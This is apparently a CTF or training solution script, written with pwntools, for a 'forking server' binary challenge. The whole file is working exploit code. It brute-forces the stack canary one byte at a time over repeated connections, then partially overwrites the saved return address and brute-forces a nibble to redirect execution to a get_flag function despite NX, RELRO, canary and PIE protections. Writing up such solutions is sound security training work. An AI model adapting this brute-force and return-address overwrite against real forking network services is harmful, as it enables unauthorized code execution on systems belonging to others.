from pwn import *
import atexit

# The binary seems to be the same as Forking Server, but with all the protections enabled (NX, full RELRO, canary and PIE). In fact, there is also a really nice function called "get_flag" (because they don't use a global buffer anymore, instead there's a local buffer in function prog). The real problem is that it doesn't print your name anymore, so we have to brute force the canary and overwrite the last three nibbles of the srip with the ones of funct get_flag and brute force the fourth to last nibble.

def exit_hndler():
    if not args.REMOTE:
        serv.kill()     # kill the server otherwise it would stay opened until shutdown
        serv.close()
        
    c.close()

COMMANDS = '''
b *get_name+44
b *get_name+69
b *prog+64
b *prog+97
c
'''

context.arch = 'amd64'
exe = './forking_server_pp'
exploit = b'b' * 1000       # Filling buffer
canary = b'\x00'

if args.REMOTE:
    target = 'forking-server-pp.training.offensivedefensive.it'
    port = 8080
    ssl = True
else:
    serv = process(exe)
    serv.recvuntil(b'Flag')
    target = '0.0.0.0'
    port = 4000
    ssl = False

with context.quiet:     # Avoiding pwtools to print all the info (conncetion started/closed)
    print('Starting to brute force the canary')

    # Brute-forcing canary (seems crazy, but we can do it one Byte at a time because the server is always on, even if we make one of its child processes crash, so worst #tries is 256*7=1792)
    for i in range(7):
        for j in range(256):
            c = remote(target, port, ssl=ssl)
            c.recvuntil(b'name?\n')

            new_byte = j.to_bytes(1)
            c.send(exploit + canary + new_byte)
            c.recvline()

            try:
                c.recvline()
                canary += new_byte
                print(f'Found new byte => canary = {canary}...')
                c.close()
                break
            except:
                if not args.REMOTE:
                    serv.recvline()     # stack smashing detected, ...
                c.close()

                if (j == 255):
                    print('Finished all possible Byte values, exiting')
                    exit(0)

    exploit += canary + b'aaaaaaaa' + b'\x49'     # filling buffer + canary + srbp + last Byte of get_flag address
    print('Done.\nStarting to brute force get_flag addr')

    # Brute forcing the fourth to last nibble of get_flag address
    for i in range(16):
        if args.GDB:
            pid = int(serv.__getattr__('pid'))
            print(pid)
            gdb.attach(pid, gdbscript=COMMANDS)     # Attaching the debuggeer to the 

        c = remote(target, port, ssl=ssl)
        c.recvuntil(b'name?\n')

        second_byte = 16*i + 4
        second_byte = second_byte.to_bytes(1)
        c.send(exploit + second_byte)
        c.recvline()

        try:
            msg = c.recvline(keepends=False)    # I dunno why, in local it always stops here at second iteration (WSL)
            flag = msg.split(b': ')[1].decode('utf-8')
            c.close()
            break
        except:
            if not args.REMOTE:
                serv.recvline()     # stack smashing detected, ...

            c.close()

            if (i == 15):
                print('Finished all possible nibble values, exiting')
                exit(0)

print('Done.\n' + flag)

'''
SIGCHLD 17: Child process has stopped or exited, changed (POSIX)
sa.flags = 0x10000000 means SA_RESTART:
    this grants the main to continue execution even if one if its child threads exits
=> instr sigaction(17, &sa, 0LL) only ensures us that we can go on connecting to the same run of the server, even if a previous connection led to a segmentation fault (addresses and canary don't change)
'''